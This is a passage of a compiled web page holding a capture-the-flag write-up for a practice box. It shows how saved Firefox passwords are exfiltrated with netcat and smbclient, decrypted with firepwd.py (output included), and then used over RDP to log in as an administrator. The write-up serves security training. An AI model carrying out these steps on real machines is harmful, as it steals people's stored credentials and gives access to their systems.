logins.json\n{"nextId":2,"logins":[{"id":1,"hostname":"https://creds.com","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECL2tyAh7wW+dBAh3qoYFOWUv1g==","encryptedPassword":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECIcug4ROmqhOBBgUMhyan8Y8Nia4wYvo6LUSNqu1z+OT8HA=","guid":"{7ccdc063-ebe9-47ed-8989-0133460b4941}","encType":1,"timeCreated":1587502931710,"timeLastUsed":1587502931710,"timePasswordChanged":1589510625802,"timesUsed":1}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}\nC:\\Users\\natbat\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljfn812a.default-release>\n')),(0,r.yg)("p",null,"At first I was told we just need a couple of files from, the ",(0,r.yg)("inlineCode",{parentName:"p"},"key4.db")," and ",(0,r.yg)("inlineCode",{parentName:"p"},"logins.json")," and I used nc.exe to upload ",(0,r.yg)("inlineCode",{parentName:"p"},"key4.db")," file to kali box. "),(0,r.yg)("admonition",{type:"tip"},(0,r.yg)("p",{parentName:"admonition"},"Reference: ",(0,r.yg)("em",{parentName:"p"},(0,r.yg)("a",{parentName:"em",href:"https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/"},'"Use nc for file transfers"')))),(0,r.yg)("p",null,"I used a tool called ",(0,r.yg)("a",{parentName:"p",href:"https://github.com/unode/firefox_decrypt"},"firefox_decrypt")," to try and decrypt the firefox user accounts/logins, but got a bit tricky."),(0,r.yg)("p",null,"Instead, the following method worked flawlessly."),(0,r.yg)("h3",{id:"firepwdpy"},"Firepwd.py"),(0,r.yg)("p",null,'Start by copying the entire firefox user profile from the THM box to your local machine, by copying it on the THM to the open "Share"'),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},"copy C:\\Users\\natbat\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljfn812a.default-release` to `C:\\Users\\Share\\profile\n")),(0,r.yg)("p",null,"Next, from my kali machine, use ",(0,r.yg)("inlineCode",{parentName:"p"},"smb //$gatekeeper-ip/Users")," to log in (make sure to be in the dir you want the files downloaded to), then used these settings to download the files to your local machine:"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},"smbclient '\\\\server\\share'\nmask \"\"\nrecurse ON\nprompt OFF\ncd 'path\\to\\remote\\dir'\nmget *\n")),(0,r.yg)("p",null,"Now on my local I have the THM box firefox profile files."),(0,r.yg)("h4",{id:"decrypt-firefox-logins"},"Decrypt firefox logins"),(0,r.yg)("p",null,"I used this ",(0,r.yg)("inlineCode",{parentName:"p"},"git clone https://github.com/lclevy/firepwd.git")," to decrypt the firefox profile (note: ",(0,r.yg)("inlineCode",{parentName:"p"},"Share/")," is where I downloaded files from the THM box):"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},"python3 firepwd.py -d Share/                                                                                    \nglobalSalt: b'2d45b7ac4e42209a23235ecf825c018e0382291d'                                                             \n SEQUENCE {                                                                                                         \n   SEQUENCE {                                                                                                       \n     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2                                                             \n     SEQUENCE {                                                                                                     \n       SEQUENCE {                                                                                                   \n         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2                                                        \n         SEQUENCE {                                                                                                 \n           OCTETSTRING b'9e0554a19d22a773d0c5497efe7a80641fa25e2e73b2ddf3fbbca61d801c116d'                          \n           INTEGER b'01'                                                                                            \n           INTEGER b'20'                                                                                            \n           SEQUENCE {                                                                                               \n             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256                                                     \n           }                                                                                                        \n         }                                                                                                          \n       }                \n       SEQUENCE {    \n         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC   \n         OCTETSTRING b'b0da1db2992a21a74e7946f23021'\n       }  \n     }  \n   }             \n   OCTETSTRING b'a713739460522b20433f7d0b49bfabdb'                                                                  \n }                                                        \nclearText b'70617373776f72642d636865636b0202'\npassword check? True\n SEQUENCE {\n   SEQUENCE {\n     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2\n     SEQUENCE {\n       SEQUENCE {\n         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2\n         SEQUENCE {\n           OCTETSTRING b'f1f75a319f519506d39986e15fe90ade00280879f00ae1e036422f001afc6267'\n           INTEGER b'01'\n           INTEGER b'20'\n           SEQUENCE {\n             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256\n           }\n         }\n       }\n       SEQUENCE {\n         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC\n         OCTETSTRING b'dbd2424eabcf4be30180860055c8'\n       }\n     }\n   }\n   OCTETSTRING b'22daf82df08cfd8aa7692b00721f870688749d57b09cb1965dde5c353589dd5d'\n }\nclearText b'86a15457f119f862f8296e4f2f6b97d9b6b6e9cb7a3204760808080808080808'\ndecrypting login/password pairs\n   https://creds.com:b'mayor',b'8CL7O********IsV'\n")),(0,r.yg)("p",null,"So you can see a ",(0,r.yg)("inlineCode",{parentName:"p"},"login/password")," combo of ",(0,r.yg)("inlineCode",{parentName:"p"},"mayor/8CL7O********IsV"),"."),(0,r.yg)("p",null,"I use this with xfreerdp to RDP into the box as a user who has Admin permissions i.e. ",(0,r.yg)("inlineCode",{parentName:"p"},"mayor"),":"),(0,r.yg)("p",null,(0,r.yg)("inlineCode",{parentName:"p"},"xfreerdp /u:mayor /p:8CL7O********IsV /v:$TARGET_IP")),(0,r.yg)("p",null,"login as mayor, who is in the admin group, and on their desktop is the ",(0,r.yg)("inlineCode",{parentName:"p"},"root.txt")," flag:"),(0,r.yg)("h3",{id:"flag-roottxt"},"Flag: root.txt"),(0,r.yg)("p",null,(0,r.yg)("inlineCode",{parentName:"p"},"{Th3_M4*******************}")))}d.isMDXComponent=!0}}]);